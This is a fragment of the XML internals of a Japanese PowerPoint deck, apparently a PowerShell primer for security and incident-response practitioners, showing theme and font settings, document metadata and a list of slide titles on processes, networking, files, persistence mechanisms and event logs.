        <a:srgbClr val="333333"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="0071BC"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="E2F1FA"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="00215D"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="0071BC"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="FF5050"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="FF8F86"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="E7E7EA"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="B5B5B8"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="0071BC"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="00215D"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="PowerPoint Design">
      <a:majorFont>
        <a:latin typeface="メイリオ"/>
        <a:ea typeface="メイリオ"/>
        <a:cs typeface=""/>
      </a:majorFont>
      <a:minorFont>
        <a:latin typeface="メイリオ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6350">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
        </a:ln>
        <a:effectLst/>
      </a:spPr>
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<a:prstTxWarp prst="textNoShape">
          <a:avLst/>
        </a:prstTxWarp>
        <a:spAutoFit/>
      </a:bodyPr>
      <a:lstStyle>
        <a:defPPr algn="just">
          <a:lnSpc>
            <a:spcPct val="140000"/>
          </a:lnSpc>
          <a:spcBef>
            <a:spcPct val="0"/>
          </a:spcBef>
          <a:spcAft>
            <a:spcPts val="600"/>
          </a:spcAft>
          <a:defRPr kumimoji="1" sz="1600" dirty="0" smtClean="0">
            <a:solidFill>
              <a:srgbClr val="4D4D4D"/>
            </a:solidFill>
            <a:latin typeface="メイリオ" pitchFamily="50" charset="-128"/>
            <a:ea typeface="メイリオ" pitchFamily="50" charset="-128"/>
            <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
          </a:defRPr>
        </a:defPPr>
      </a:lst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7052</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>ワイド画面</PresentationFormat>
  <Paragraphs>1148</Paragraphs>
  <Slides>63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63</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="72" baseType="lpstr">
      <vt:lpstr>Meiryo UI</vt:lpstr>
      <vt:lpstr>SFMono-Regular</vt:lpstr>
      <vt:lpstr>メイリオ</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Segoe UI</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>presentation-design-2022-wide</vt:lpstr>
      <vt:lpstr>PowerShell超特急 《増補版》</vt:lpstr>
      <vt:lpstr>情報セキュリティ実務家のための PowerShell超特急 《増補版》</vt:lpstr>
      <vt:lpstr>基本事項</vt:lpstr>
      <vt:lpstr>基本事項 | コマンドレット</vt:lpstr>
      <vt:lpstr>基本事項 | パラメーター</vt:lpstr>
      <vt:lpstr>基本事項 | サバイバルCmdlets</vt:lpstr>
      <vt:lpstr>基本事項 | パイプライン</vt:lpstr>
      <vt:lpstr>プロセス</vt:lpstr>
      <vt:lpstr>プロセス | 事案対処の現場で調査すること</vt:lpstr>
      <vt:lpstr>プロセス | Get-Process</vt:lpstr>
      <vt:lpstr>プロセス | 好きなフィールドを表示させる</vt:lpstr>
      <vt:lpstr>プロセス | 条件を満たすオブジェクトを抽出する</vt:lpstr>
      <vt:lpstr>プロセス | オブジェクトのプロパティを確認する</vt:lpstr>
      <vt:lpstr>プロセス | Get-CimInstance</vt:lpstr>
      <vt:lpstr>プロセス | WMI/CIMとPowerShell</vt:lpstr>
      <vt:lpstr>プロセス | CIMにアクセスするCmdlet</vt:lpstr>
      <vt:lpstr>プロセス | フィールド追加</vt:lpstr>
      <vt:lpstr>プロセス | PowerShellの波括弧と丸括弧</vt:lpstr>
      <vt:lpstr>ネットワーク</vt:lpstr>
      <vt:lpstr>ネットワーク | DNS</vt:lpstr>
      <vt:lpstr>ネットワーク | L4 - 疎通確認</vt:lpstr>
      <vt:lpstr>ネットワーク | L4 - 接続確認</vt:lpstr>
      <vt:lpstr>ネットワーク | L3</vt:lpstr>
      <vt:lpstr>ネットワーク | L2</vt:lpstr>
      <vt:lpstr>ネットワーク | ファイアウォール</vt:lpstr>
      <vt:lpstr>ネットワーク | 外部ファイルの利用（パイプの値渡し）</vt:lpstr>
      <vt:lpstr>ネットワーク | 外部ファイルの利用（パイプのプロパティ名渡し）</vt:lpstr>
      <vt:lpstr>ファイル</vt:lpstr>
      <vt:lpstr>ファイル | ファイル出力</vt:lpstr>
      <vt:lpstr>ファイル | 外形（md5sum、wc）</vt:lpstr>
      <vt:lpstr>ファイル | NTFS代替データストリーム</vt:lpstr>
      <vt:lpstr>ファイル | アクセス権</vt:lpstr>
      <vt:lpstr>ファイル | ファイル共有</vt:lpstr>
      <vt:lpstr>ファイル | パスの操作</vt:lpstr>
      <vt:lpstr>ファイル | 8.3ファイル形式（COMオブジェクトの利用）</vt:lpstr>
      <vt:lpstr>永続化</vt:lpstr>
      <vt:lpstr>永続化 | Windowsにおける永続化手法</vt:lpstr>
      <vt:lpstr>永続化 | レジストリ</vt:lpstr>
      <vt:lpstr>永続化 | PSDrive</vt:lpstr>
      <vt:lpstr>永続化 | サービス</vt:lpstr>
      <vt:lpstr>永続化 | スケジュールタスク</vt:lpstr>
      <vt:lpstr>永続化 | WMIイベントコンシューマー</vt:lpstr>
      <vt:lpstr>永続化 | Base64 Encode/Decode（.NETの利用）</vt:lpstr>
      <vt:lpstr>イベントログ</vt:lpstr>
      <vt:lpstr>イベントログ | 一覧取得</vt:lpstr>
      <vt:lpstr>イベントログ | MaxEventsで取得件数を制限</vt:lpstr>
      <vt:lpstr>イベントログ | FilterHashtableで条件づけして抽出</vt:lpstr>
      <vt:lpstr>イベントログ | Message</vt:lpstr>
      <vt:lpstr>イベントログ | XML型に変換してMessageを処理</vt:lpstr>
      <vt:lpstr>イベントログ | Convert-EventLogRecord</vt:lpstr>
      <vt:lpstr>イベントログ | Convert-EventLogRecordの使用例</vt:lpstr>
      <vt:lpstr>イベントログ | REST APIとJSON形式の処理</vt:lpstr>
      <vt:lpstr>環境整備</vt:lpstr>
      <vt:lpstr>環境整備</vt:lpstr>
      <vt:lpstr>環境整備 | 作業記録を出力する</vt:lpstr>
      <vt:lpstr>環境整備 | キーボード配列を日本語JISにする（SANS受講者向け）</vt:lpstr>
      <vt:lpstr>学習案内</vt:lpstr>
      <vt:lpstr>学習案内 | 読みもの</vt:lpstr>
      <vt:lpstr>学習案内 | レファレンス</vt:lpstr>
      <vt:lpstr>学習案内 | SEC504とPowerShellオリンピック</vt:lpstr>
      <vt:lpstr>まとめ</vt:lpstr>
      <vt:lpstr>まとめ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情報セキュリティ実務家のためのPowerShell超特急</dc:title>
  <dc:creator/>
  <cp:lastModifiedBy/>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-07-06T06:22:47Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-12-06T09:16:01Z</dcterms:modified>
</cp:coreProperties>
</file>